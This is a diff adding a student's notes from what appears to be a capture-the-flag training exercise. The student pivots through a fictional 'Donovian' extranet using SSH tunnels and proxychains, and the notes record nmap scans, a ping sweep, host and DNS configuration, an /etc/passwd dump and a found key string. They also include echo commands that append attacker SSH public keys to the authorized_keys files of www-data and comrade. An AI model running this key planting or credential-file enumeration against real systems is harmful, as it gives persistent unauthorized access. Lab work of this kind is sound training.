@@ -769,3 +769,669 @@ VALUES ('test2', 'test2', 'test2', 'test2', 'test2', 3)
 
 
 
+
+
+
+
+
+
+
+Objective: 
+Maneuver through Donovian-Extranet, 
+identify and gain access futher into Donovian internal Cyberspace, 
+it is believed that there is an network that acts as an internal DMZ between these to locations. 
+Intelligence was able to identify the last octet of a system that resides in the Donovian internal Cyberspace.
+
+Tools/Techniques: 
+All connections will be established through SSH masquerades or web browser. 
+Ports in use will be dependent on target location and are subject to change. 
+Network scanning tools/technique usage is at the discretion of student. 
+Credential reuse is authorized
+
+
+
+Prior Approvals: 
+Sudo usage and remote port forward is authorized.
+System dir walks from system roots, altering accounts/routing or tool uploads are authorized.
+Survey and access to newly discovered systems during C-ISR.
+
+Scheme of Maneuver:
+>Jump Box
+->T1: 192.168.28.100
+-->T2:X.X.X.X
+-->T3:x.x.x.9
+
+Target Section:
+
+
+T1
+Hostname: Donovian_Extranet
+IP: 192.168.28.100
+OS: CentOS
+Creds:     comrade : 
+Last Known SSH Port: 2222
+PSP: none
+Malware: none
+Action: Perform SSH masquerade and survey system. Identify redirection to the next target.
+PORT     STATE SERVICE
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+80 web page, 2222 ssh
+
+T2
+Hostname: Donovian_Intranet
+IP: X.X.X.X
+OS: Ubuntu
+Creds:Unknown
+Last Known SSH Port: X
+PSP: none
+Malware: none
+Action: Perform SSH masquerade and survey system. Identify redirection to the next target.
+
+
+T3
+Hostname: Donovian_Internal
+IP: x.x.x.9
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Gain access; survey host and map Donovian internal Cyberspace.
+
+Post - Intranet 8
+0
+Find a way to read a file on the Intranet target without using ssh. 
+Show an instructor how you completed this to get the flag.
+
+
+
+
+
+
+
+
+T1
+Hostname: Donovian_Extranet
+IP: 192.168.28.100
+OS: CentOS
+Creds:     comrade : 
+Last Known SSH Port: 2222
+PSP: none
+Malware: none
+Action: Perform SSH masquerade and survey system. Identify redirection to the next target.
+PORT     STATE SERVICE
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+80 web page, 2222 ssh
+
+Nmap scan report for 192.168.28.100
+Host is up (0.00050s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+
+proxychains nc 192.168.28.100 2222
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-<>-127.0.0.1:9050-<><>-192.168.28.100:2222-<><>-OK
+SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
+
+ssh -S /tmp/jump t1 -O forward -L20001:192.168.28.100:2222 -L8002:192.168.28.100:80
+
+PORT     STATE SERVICE
+80/tcp   open  http
+| http-enum: 
+|   /admin/: Possible admin folder
+|   /admin/login.php: Possible admin folder
+|_  /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+2222/tcp open  EtherNetIP-1
+
+2: ens3:  mtu 1450 qdisc fq_codel state UP group default qlen 1000
+    link/ether fa:16:3e:0a:4c:76 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.28.100/27 brd 192.168.28.127 scope global dynamic ens3
+       valid_lft 55859sec preferred_lft 55859sec
+    inet6 fe80::f816:3eff:fe0a:4c76/64 scope link 
+       valid_lft forever preferred_lft forever
+
+? (192.168.28.98) at fa:16:3e:97:40:60 [ether] on ens3
+? (192.168.28.97) at fa:16:3e:a5:35:12 [ether] on ens3
+? (192.168.28.104) at fa:16:3e:4f:1b:79 [ether] on ens3
+
+# The following lines are desirable for IPv6 capable hosts
+::1 ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+ff02::3 ip6-allhosts
+192.168.150.253 Donovian-Intranet
+
+# This file is managed by man:systemd-resolved(8). Do not edit.
+#
+# This is a dynamic resolv.conf file for connecting local clients to the
+# internal DNS stub resolver of systemd-resolved. This file lists all
+# configured search domains.
+#
+# Run "systemd-resolve --status" to see details about the uplink DNS servers
+# currently in use.
+#
+# Third party programs must not access this file directly, but only through the
+# symlink at /etc/resolv.conf. To manage man:resolv.conf(5) in a different way,
+# replace this symlink by a static file or a different symlink.
+#
+# See man:systemd-resolved.service(8) for details about the supported modes of
+# operation for /etc/resolv.conf.
+
+nameserver 127.0.0.53
+options edns0
+search vta
+
+Global
+          DNSSEC NTA: 10.in-addr.arpa
+                      16.172.in-addr.arpa
+                      168.192.in-addr.arpa
+                      17.172.in-addr.arpa
+                      18.172.in-addr.arpa
+                      19.172.in-addr.arpa
+                      20.172.in-addr.arpa
+                      21.172.in-addr.arpa
+                      22.172.in-addr.arpa
+                      23.172.in-addr.arpa
+                      24.172.in-addr.arpa
+                      25.172.in-addr.arpa
+                      26.172.in-addr.arpa
+                      27.172.in-addr.arpa
+                      28.172.in-addr.arpa
+                      29.172.in-addr.arpa
+                      30.172.in-addr.arpa
+                      31.172.in-addr.arpa
+                      corp
+                      d.f.ip6.arpa
+                      home
+                      internal
+                      intranet
+                      lan
+                      local
+                      private
+                      test
+
+Link 2 (ens3)
+      Current Scopes: DNS
+       LLMNR setting: yes
+MulticastDNS setting: no
+      DNSSEC setting: no
+    DNSSEC supported: no
+         DNS Servers: 10.0.28.52
+          DNS Domain: vta
+
+
+/usr/src/linux-headers-4.15.0-88/include/drm/drm_modeset_helper_vtables.h
+/usr/src/linux-headers-4.15.0-88-generic/include/config/ipvtap.h
+/usr/src/linux-headers-4.15.0-88-generic/include/config/macvtap.h
+/usr/share/groff/1.22.3/tmac/devtag.tmac
+/usr/lib/x86_64-linux-gnu/perl/5.26.1/CORE/mg_vtable.h
+/lib/modules/4.15.0-88-generic/kernel/drivers/net/macvtap.ko
+/lib/modules/4.15.0-88-generic/kernel/drivers/net/ipvlan/ipvtap.ko
+
+/home/comrade/Dekstop/network/.mapkey.txt
+uVUE7Ecc8KR2PnqsoIJm
+
+
+
+
+
+
+
+
+Post - Intranet 2
+5
+Level II Challenge
+Enumerate all items related to syslog and rsyslog.
+
+
+/etc/default/rsyslog
+/etc/init.d/rsyslog
+/etc/rc2.d/S01rsyslog
+/etc/rc1.d/K01rsyslog
+/etc/systemd/system/syslog.service
+/etc/systemd/system/multi-user.target.wants/rsyslog.service
+/etc/rsyslog.d
+    total 12
+    -rw-r--r-- 1 root root  314 Aug 15  2017 20-ufw.conf
+    -rw-r--r-- 1 root root  255 Jan 15  2020 21-cloudinit.conf
+    -rw-r--r-- 1 root root 1124 Jan 30  2018 50-default.conf
+        #  Default rules for rsyslog.
+        #
+        #			For more information see rsyslog.conf(5) and /etc/rsyslog.conf
+        
+        #
+        # First some standard log files.  Log by facility.
+        #
+        auth,authpriv.*			/var/log/auth.log
+        *.*;auth,authpriv.none		-/var/log/syslog
+        #cron.*				/var/log/cron.log
+        #daemon.*			-/var/log/daemon.log
+        kern.*				-/var/log/kern.log
+        #lpr.*				-/var/log/lpr.log
+        mail.*				-/var/log/mail.log
+        #user.*				-/var/log/user.log
+        
+        #
+        # Logging for the mail system.  Split it up so that
+        # it is easy to write scripts to parse these files.
+        #
+        #mail.info			-/var/log/mail.info
+        #mail.warn			-/var/log/mail.warn
+        mail.err			/var/log/mail.err
+        
+        #
+        # Some "catch-all" log files.
+        #
+        #*.=debug;\
+        #	auth,authpriv.none;\
+        #	news.none;mail.none	-/var/log/debug
+        #*.=info;*.=notice;*.=warn;\
+        #	auth,authpriv.none;\
+        #	cron,daemon.none;\
+        #	mail,news.none		-/var/log/messages
+        
+        #
+        # Emergencies are sent to everybody logged in.
+        #
+        *.emerg				:omusrmsg:*
+        
+        #
+        # I like to have messages displayed on the console, but only on a virtual
+        # console I usually leave idle.
+        #
+        #daemon,mail.*;\
+        #	news.=crit;news.=err;news.=notice;\
+        #	*.=debug;*.=info;\
+        #	*.=notice;*.=warn	/dev/tty8
+/etc/rc5.d/S01rsyslog
+/etc/rsyslog.conf
+    #  /etc/rsyslog.conf	Configuration file for rsyslog.
+    #
+    #			For more information see
+    #			/usr/share/doc/rsyslog-doc/html/rsyslog_conf.html
+    #
+    #  Default logging rules can be found in /etc/rsyslog.d/50-default.conf
+    
+    
+    #################
+    #### MODULES ####
+    #################
+    
+    module(load="imuxsock") # provides support for local system logging
+    #module(load="immark")  # provides --MARK-- message capability
+    
+    # provides UDP syslog reception
+    #module(load="imudp")
+    #input(type="imudp" port="514")
+    
+    # provides TCP syslog reception
+    #module(load="imtcp")
+    #input(type="imtcp" port="514")
+    
+    # provides kernel logging support and enable non-kernel klog messages
+    module(load="imklog" permitnonkernelfacility="on")
+    
+    ###########################
+    #### GLOBAL DIRECTIVES ####
+    ###########################
+    
+    #
+    # Use traditional timestamp format.
+    # To enable high precision timestamps, comment out the following line.
+    #
+    $ActionFileDefaultTemplate RSYSLOG_TraditionalFileFormat
+    
+    # Filter duplicated messages
+    $RepeatedMsgReduction on
+    
+    #
+    # Set the default permissions for all log files.
+    #
+    $FileOwner syslog
+    $FileGroup adm
+    $FileCreateMode 0640
+    $DirCreateMode 0755
+    $Umask 0022
+    $PrivDropToUser syslog
+    $PrivDropToGroup syslog
+    
+    #
+    # Where to place spool and state files
+    #
+    $WorkDirectory /var/spool/rsyslog
+    
+    #
+    # Include all config files in /etc/rsyslog.d/
+    #
+    $IncludeConfig /etc/rsyslog.d/*.conf
+/etc/logrotate.d/rsyslog
+/etc/logcheck/ignore.d.server/rsyslog
+/etc/rc3.d/S01rsyslog
+/etc/apparmor.d/usr.sbin.rsyslogd
+/etc/apparmor.d/disable/usr.sbin.rsyslogd
+/etc/apparmor.d/local/usr.sbin.rsyslogd
+/etc/rc4.d/S01rsyslog
+/etc/rc0.d/K01rsyslog
+/etc/rc6.d/K01rsyslog
+/var/spool/rsyslog
+/var/log/syslog.5.gz
+/var/log/syslog
+/var/log/syslog.4.gz
+/var/log/syslog.1
+/var/log/syslog.6.gz
+/var/log/syslog.2.gz
+/var/log/syslog.3.gz
+/var/log/syslog.7.gz
+/var/lib/dpkg/info/rsyslog.postrm
+/var/lib/dpkg/info/rsyslog.conffiles
+/var/lib/dpkg/info/rsyslog.list
+/var/lib/dpkg/info/rsyslog.postinst
+/var/lib/dpkg/info/rsyslog.md5sums
+/var/lib/dpkg/info/rsyslog.prerm
+/var/lib/dpkg/info/rsyslog.triggers
+/var/lib/dpkg/info/rsyslog.preinst
+/var/lib/ucf/cache/:etc:rsyslog.d:50-default.conf
+/var/lib/lxcfs/cgroup/cpu,cpuacct/system.slice/rsyslog.service
+/var/lib/lxcfs/cgroup/blkio/system.slice/rsyslog.service
+/var/lib/lxcfs/cgroup/devices/system.slice/rsyslog.service
+/var/lib/lxcfs/cgroup/pids/system.slice/rsyslog.service
+/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service
+/var/lib/lxcfs/cgroup/name=systemd/system.slice/rsyslog.service
+/var/lib/systemd/deb-systemd-helper-enabled/syslog.service
+/var/lib/systemd/deb-systemd-helper-enabled/multi-user.target.wants/rsyslog.service
+/var/lib/systemd/deb-systemd-helper-enabled/rsyslog.service.dsh-also
+/var/lib/cloud/instances/iid-datasource-none/sem/config_rsyslog
+/run/rsyslogd.pid
+/run/systemd/journal/syslog
+/run/systemd/units/invocation:rsyslog.service
+/usr/src/linux-headers-4.15.0-88/include/linux/syslog.h
+/usr/share/doc/cloud-init/examples/cloud-config-rsyslog.txt
+/usr/share/doc/mdadm/examples/syslog-events
+/usr/share/doc/busybox-static/syslog.conf.txt
+/usr/share/doc/sudo/examples/syslog.conf
+/usr/share/doc/rsyslog
+/usr/share/doc/rsyslog/examples/rsyslog.d
+/usr/share/lintian/overrides/rsyslog
+/usr/share/man/man5/rsyslog.conf.5.gz
+/usr/share/man/man8/rsyslogd.8.gz
+/usr/share/rsyslog
+/usr/sbin/rsyslogd
+/usr/lib/x86_64-linux-gnu/rsyslog
+/usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/syslog-ldbl.ph
+/usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/syslog.ph
+/usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/syslog-path.ph
+/usr/lib/x86_64-linux-gnu/perl/5.26.1/syslog.ph
+/usr/lib/x86_64-linux-gnu/perl/5.26.1/sys/syslog.ph
+/usr/lib/python3/dist-packages/twisted/python/__pycache__/syslog.cpython-36.pyc
+/usr/lib/python3/dist-packages/twisted/python/syslog.py
+/usr/lib/python3/dist-packages/twisted/python/test/__pycache__/test_syslog.cpython-36.pyc
+/usr/lib/python3/dist-packages/twisted/python/test/test_syslog.py
+/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_rsyslog.cpython-36.pyc
+/usr/lib/python3/dist-packages/cloudinit/config/cc_rsyslog.py
+/usr/lib/tmpfiles.d/00rsyslog.conf
+/usr/lib/rsyslog
+/usr/lib/rsyslog/rsyslog-rotate
+/sys/kernel/slab/:A-0005888/cgroup/task_struct(544:rsyslog.service)
+/sys/kernel/slab/:0000512/cgroup/kmalloc-512(544:rsyslog.service)
+/sys/kernel/slab/:A-0000192/cgroup/cred_jar(544:rsyslog.service)
+/sys/kernel/slab/sock_inode_cache/cgroup/sock_inode_cache(544:rsyslog.service)
+/sys/kernel/slab/radix_tree_node/cgroup/radix_tree_node(544:rsyslog.service)
+/sys/kernel/slab/:0000008/cgroup/kmalloc-8(544:rsyslog.service)
+/sys/kernel/slab/proc_inode_cache/cgroup/proc_inode_cache(544:rsyslog.service)
+/sys/kernel/slab/:A-0000064/cgroup/pid(544:rsyslog.service)
+/sys/kernel/slab/:0000016/cgroup/kmalloc-16(544:rsyslog.service)
+/sys/kernel/slab/anon_vma/cgroup/anon_vma(544:rsyslog.service)
+/sys/kernel/slab/:0000032/cgroup/kmalloc-32(544:rsyslog.service)
+/sys/kernel/slab/inode_cache/cgroup/inode_cache(544:rsyslog.service)
+/sys/kernel/slab/shmem_inode_cache/cgroup/shmem_inode_cache(544:rsyslog.service)
+/sys/kernel/slab/:A-0002112/cgroup/mm_struct(544:rsyslog.service)
+/sys/kernel/slab/:0000256/cgroup/kmalloc-256(544:rsyslog.service)
+/sys/kernel/slab/:A-0000256/cgroup/filp(544:rsyslog.service)
+/sys/kernel/slab/:A-0000208/cgroup/vm_area_struct(544:rsyslog.service)
+/sys/kernel/slab/ext4_inode_cache/cgroup/ext4_inode_cache(544:rsyslog.service)
+/sys/kernel/slab/:aA-0000192/cgroup/dentry(544:rsyslog.service)
+/sys/fs/cgroup/cpu,cpuacct/system.slice/rsyslog.service
+/sys/fs/cgroup/blkio/system.slice/rsyslog.service
+/sys/fs/cgroup/devices/system.slice/rsyslog.service
+/sys/fs/cgroup/pids/system.slice/rsyslog.service
+/sys/fs/cgroup/memory/system.slice/rsyslog.service
+/sys/fs/cgroup/systemd/system.slice/rsyslog.service
+/sys/fs/cgroup/unified/system.slice/rsyslog.service
+/lib/systemd/system/syslog.socket
+    #  SPDX-License-Identifier: LGPL-2.1+
+    #
+    #  This file is part of systemd.
+    #
+    #  systemd is free software; you can redistribute it and/or modify it
+    #  under the terms of the GNU Lesser General Public License as published by
+    #  the Free Software Foundation; either version 2.1 of the License, or
+    #  (at your option) any later version.
+    
+    [Unit]
+    Description=Syslog Socket
+    Documentation=man:systemd.special(7)
+    Documentation=https://www.freedesktop.org/wiki/Software/systemd/syslog
+    DefaultDependencies=no
+    Before=sockets.target
+    
+    # Don't allow logging until the very end
+    Conflicts=shutdown.target
+    Before=shutdown.target
+    
+    # Don't try to activate syslog.service if sysinit.target has failed.
+    Conflicts=emergency.service
+    Before=emergency.service
+    
+    [Socket]
+    ListenDatagram=/run/systemd/journal/syslog
+    SocketMode=0666
+    PassCredentials=yes
+    PassSecurity=yes
+    ReceiveBuffer=8M
+    
+    # The default syslog implementation should make syslog.service a
+    # symlink to itself, so that this socket activates the right actual
+    # syslog service.
+    #
+    # Examples:
+    #
+    # /etc/systemd/system/syslog.service -> /lib/systemd/system/rsyslog.service
+    # /etc/systemd/system/syslog.service -> /lib/systemd/system/syslog-ng.service
+    #
+    # Best way to achieve that is by adding this to your unit file
+    # (i.e. to rsyslog.service or syslog-ng.service):
+    #
+    # [Install]
+    # Alias=syslog.service
+    #
+    # See https://www.freedesktop.org/wiki/Software/systemd/syslog for details.
+/lib/systemd/system/rsyslog.service
+
+
+/home/ubuntu/.ssh
+/home/comrade/.ssh
+/usr/src/linux-headers-4.15.0-88-generic/.tmp_versions
+/lib/modules/4.15.0-88-generic/vdso/.build-id
+
+
+
+/var/log
+total 3932
+-rw-r--r--  1 root      root               1290 May  4  2023 alternatives.log
+drwxr-x---  2 root      adm                4096 Sep 26 06:25 apache2
+drwxr-xr-x  2 root      root               4096 May  4  2023 apt
+-rw-r-----  1 syslog    adm             1260551 Sep 26 14:05 auth.log
+-rw-r-----  1 syslog    adm             1693683 Sep 22 06:25 auth.log.1
+-rw-rw----  1 root      utmp               1152 May  4  2023 btmp
+-rw-r--r--  1 root      root              72515 Sep 16 13:52 cloud-init-output.log
+-rw-r--r--  1 syslog    adm              310259 Sep 16 13:52 cloud-init.log
+drwxr-xr-x  2 root      root               4096 Jan 24  2020 dist-upgrade
+-rw-r--r--  1 root      root              70230 May  4  2023 dpkg.log
+drwxr-sr-x+ 3 root      systemd-journal    4096 May  4  2023 journal
+-rw-r-----  1 syslog    adm                 176 Sep 26 13:18 kern.log
+-rw-r-----  1 syslog    adm              199493 Sep 16 13:52 kern.log.1
+drwxr-xr-x  2 landscape landscape          4096 Feb 20  2020 landscape
+-rw-rw-r--  1 root      utmp             292584 May  4  2023 lastlog
+drwxr-xr-x  2 root      root               4096 Nov 23  2018 lxd
+drwxr-s---  2 mysql     adm                4096 Sep 26 06:25 mysql
+-rw-r-----  1 syslog    adm               54602 Sep 26 14:05 syslog
+-rw-r-----  1 syslog    adm              172478 Sep 26 06:25 syslog.1
+-rw-r-----  1 syslog    adm               11397 Sep 25 06:25 syslog.2.gz
+-rw-r-----  1 syslog    adm               11604 Sep 24 06:25 syslog.3.gz
+-rw-r-----  1 syslog    adm               11700 Sep 23 06:25 syslog.4.gz
+-rw-r-----  1 syslog    adm               11636 Sep 22 06:25 syslog.5.gz
+-rw-r-----  1 syslog    adm               11736 Sep 21 06:25 syslog.6.gz
+-rw-r-----  1 syslog    adm               11419 Sep 20 06:25 syslog.7.gz
+-rw-------  1 root      root              64128 May  4  2023 tallylog
+drwxr-x---  2 root      adm                4096 May  4  2023 unattended-upgrades
+-rw-rw-r--  1 root      utmp              11520 Sep 16 13:52 wtmp
+
+/etc/rsyslog.conf
+
+
+/usr/share/doc/rsyslog-doc/html/rsyslog_conf.html
+
+/usr/share/doc/rsyslog
+    total 52
+    14452  4 drwxr-xr-x   3 root root  4096 Mar  4  2020 .
+    13214 20 drwxr-xr-x 535 root root 20480 May  4  2023 ..
+    14453  4 -rw-r--r--   1 root root   501 Dec  7  2017 AUTHORS
+    14454  4 -rw-r--r--   1 root root   438 Jan 14  2018 NEWS.Debian.gz
+    14455  4 -rw-r--r--   1 root root  1821 Jan 14  2018 README.Debian
+    14456  4 -rw-r--r--   1 root root  2727 Apr 24  2018 changelog.Debian.gz
+    14457  8 -rw-r--r--   1 root root  4454 Jan 14  2018 copyright
+    14458  4 drwxr-xr-x   4 root root  4096 Mar  4  2020 examples
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/bin/bash
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+comrade:x:1001:1001::/home/comrade:/bin/bash
+mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
+
+
+
+/var/www
+
+/home/comrade
+/home/comrade/.ssh
+www-data
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSn8DFGMc3/cEaWRl7LiOqiezIl3Txk4eSi1y6RK1D52sYay4Z8jxhbZiLN8VUcrMGl9zswkhdVREfzQR2aLT/oH8qHSZCG3uMyo753QFr/6QTPMpymU0dJtpqeSwGqRTRaOqk8G2ZCJZ/s9aMCtAvCWNGN2ceW4psOCOdq1mGWuVpuwmDiuZ0FEejYOButCAg/mxn6gV2VTh8ILnDqtB9TX5el/TwCHPUun6dcS31trIFmqF6zdr4h+HDCTJS/KA5y2fJAvsO+wozoBeNgJ0YE9RaOLbaf5N0MhkqUieEIvIl1d/q1X3I4sf+avkxOGB2AMERC5bkEk9w8qN32up3 student@lin-ops
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIvDD3YjyLK3yfmEd4C0ge/Dbw5rWqeW7lGDYeNpsDS1Ii/DtTJgPWWuQl6N7XKNK1fg9GDwGTFWS59wkhcgAzvqkbHpoXDCPOEXiZxhl1D/0yR573gKIl5/xrIAbdSawRssQY3XnoZnnwqxRFsij980gAwLIYH33Suq5sV4jLb7l702phjTxL1XtXp7t9xn5y5ojy3sQ5fccxPEV0oM7/ppe2NkHoZTUBFxcEoLg0vcm0uGyeNUaRWnbR89Y23HhQyPV9PZ+dqpZS/a6JzSTU+rjfbSoWWdADlQ/o1P20h6Q2dteaMa/el1tKZu3jFhnXXp+0f1h8yRbY6OLnxPBP student@lin-ops
+
+echo "" >> /home/comrade/.ssh/authorized_keys
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIvDD3YjyLK3yfmEd4C0ge/Dbw5rWqeW7lGDYeNpsDS1Ii/DtTJgPWWuQl6N7XKNK1fg9GDwGTFWS59wkhcgAzvqkbHpoXDCPOEXiZxhl1D/0yR573gKIl5/xrIAbdSawRssQY3XnoZnnwqxRFsij980gAwLIYH33Suq5sV4jLb7l702phjTxL1XtXp7t9xn5y5ojy3sQ5fccxPEV0oM7/ppe2NkHoZTUBFxcEoLg0vcm0uGyeNUaRWnbR89Y23HhQyPV9PZ+dqpZS/a6JzSTU+rjfbSoWWdADlQ/o1P20h6Q2dteaMa/el1tKZu3jFhnXXp+0f1h8yRbY6OLnxPBP student@lin-ops" >> /var/www/.ssh/authorized_keys
+
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSn8DFGMc3/cEaWRl7LiOqiezIl3Txk4eSi1y6RK1D52sYay4Z8jxhbZiLN8VUcrMGl9zswkhdVREfzQR2aLT/oH8qHSZCG3uMyo753QFr/6QTPMpymU0dJtpqeSwGqRTRaOqk8G2ZCJZ/s9aMCtAvCWNGN2ceW4psOCOdq1mGWuVpuwmDiuZ0FEejYOButCAg/mxn6gV2VTh8ILnDqtB9TX5el/TwCHPUun6dcS31trIFmqF6zdr4h+HDCTJS/KA5y2fJAvsO+wozoBeNgJ0YE9RaOLbaf5N0MhkqUieEIvIl1d/q1X3I4sf+avkxOGB2AMERC5bkEk9w8qN32up3 student@lin-ops" >> /home/comrade/.ssh/authorized_keys
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIvDD3YjyLK3yfmEd4C0ge/Dbw5rWqeW7lGDYeNpsDS1Ii/DtTJgPWWuQl6N7XKNK1fg9GDwGTFWS59wkhcgAzvqkbHpoXDCPOEXiZxhl1D/0yR573gKIl5/xrIAbdSawRssQY3XnoZnnwqxRFsij980gAwLIYH33Suq5sV4jLb7l702phjTxL1XtXp7t9xn5y5ojy3sQ5fccxPEV0oM7/ppe2NkHoZTUBFxcEoLg0vcm0uGyeNUaRWnbR89Y23HhQyPV9PZ+dqpZS/a6JzSTU+rjfbSoWWdADlQ/o1P20h6Q2dteaMa/el1tKZu3jFhnXXp+0f1h8yRbY6OLnxPBP student@lin-ops" >> /home/comrade/.ssh/authorized_keys
+
+
+
+ssh -MS /tmp/T1 www-data
+
+
+
+
+
+
+192.168.28.97-192.168.28.126
+
+for i in {96..126};do (ping -c 1 192.168.28.$i 2>/dev/null | grep "bytes from" &) ;done
+
+
+www-data@extranet:~$ 64 bytes from 192.168.28.100: icmp_seq=1 ttl=64 time=0.013 ms
+64 bytes from 192.168.28.98: icmp_seq=1 ttl=64 time=1.16 ms
+64 bytes from 192.168.28.99: icmp_seq=1 ttl=64 time=1.19 ms
+64 bytes from 192.168.28.104: icmp_seq=1 ttl=64 time=0.883 ms
+64 bytes from 192.168.28.97: icmp_seq=1 ttl=64 time=0.411 ms
+
+
+
+Nmap scan report for 192.168.28.97
+Host is up (0.00061s latency).
+All 64980 scanned ports on 192.168.28.97 are closed
+
+Nmap scan report for 192.168.28.98
+Host is up (0.00080s latency).
+Not shown: 64979 closed ports
+PORT   STATE SERVICE
+53/tcp open  domain
+
+
+
+Nmap scan report for 192.168.28.99
+Host is up (0.0011s latency).
+Not shown: 64979 closed ports
+PORT   STATE SERVICE
+53/tcp open  domain
+
+
+Nmap scan report for 192.168.28.104
+Host is up (0.00079s latency).
+All 64980 scanned ports on 192.168.28.104 are closed
+
+
+
+/usr/share/doc/gawk/examples/data/inventory-shipped
+/usr/share/equip-inventory.txt
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
